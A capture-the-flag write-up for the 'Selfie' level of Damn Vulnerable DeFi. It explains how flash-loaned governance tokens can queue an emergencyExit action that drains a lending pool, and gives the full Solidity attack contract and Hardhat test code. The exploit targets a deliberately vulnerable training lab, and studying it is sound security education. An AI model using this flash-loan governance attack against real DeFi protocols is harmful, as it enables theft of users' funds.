### [Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/selfie)
### Task

>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

>What could go wrong, right ?

>You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.

### Observations

- Looks like a solid flashloan pool at the moment, but it inherits and utilises a fancy governance mechanism to execute transactions and function calls.

- There is a strange function `emergencyExit(address)` which sends the pools total funds to the address, as long as the call came from the governance contract.

- That seems like the focus immediately - Find a way to break the governance to call this function with my address.

- To queue an action in the gov contract I need more than 50% of the token total supply.

- Fortunately the flashloan pool holds the same token as used for governance, and the pool holds >50% of the total supply. (1,500,000 / 2,000,000).

- So we should just be able to create a contract to flashloan the maximum, queue a governance action, then repay the flashloan.

- Note. We will have to wait 2 days before the action can be executed.

### Steps 
*Full malicious smart contract is attached in this repo.*
- Create a malicious smart contract (inheriting `IERC3156FlashBorrower`) that calls a maximum flashloan of DVT:
```
function attack() public returns (uint256) {
        require(owner == msg.sender, "Only Owner");

        // Get the maximum tokens to borrow.
        uint256 maxAmount = selfiePool.maxFlashLoan(address(token));
        //Start flashloan for maximum
        selfiePool.flashLoan(
            IERC3156FlashBorrower(this),
            address(token),
            maxAmount,
            ""
        );
        // selfiePool will call `onFlashLoan()`
    }
```

- The `selfiePool` will call to `onFlashLoan` during the flashloan. Within which we must: 
  - take a token snapshot to show our new balance,
  - get the function signature of the `emergencyExit()` function we want to call, with `owner` as param.
  - create a new action to queue on the governance contract, with `selfiePool` as the target address, and the `emergencyExit` data as the data param,
  - repay the loan,
  - return the key to the lender:

```
function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        require(msg.sender == address(selfiePool), "Only Pool");
        //get snapshot to secure our current large balance in token memory
        token.snapshot();

        //get function data to drain contract
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            owner
        );

        //queue action the flashpool as target, no value, function data
        //saves the actionID
        actionID = governancePool.queueAction(address(selfiePool), 0, data);

        //repay the loan
        token.approve(address(selfiePool), _amount);

        //return the key hash
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```

- Create a function to execute the transaction after the 2 days have passed.
```
function drainFunds() external {
        require(owner == msg.sender, "Only Owner");

        //calls to execute the drain function to owner address
        governancePool.executeAction(actionID);
    }
```

- In the Execution JS file:
  - deploy hack contract from the player address.
  - call the `attack()` func from player address.
  - skip forward 2 days.
  - call `drainFunds()` from player address.

```
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Deploy Selfie Hack Contract
        const hack = await (await ethers.getContractFactory('SelfieHack', player))
            .deploy(pool.address, governance.address, token.address);

        //call attack function to start flashloan and governance action queue.
        await hack.connect(player).attack();

        //skip forward in time 2 days.
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        //call to execute actionID, to drain to attacker
        await hack.connect(player).drainFunds();
    });
```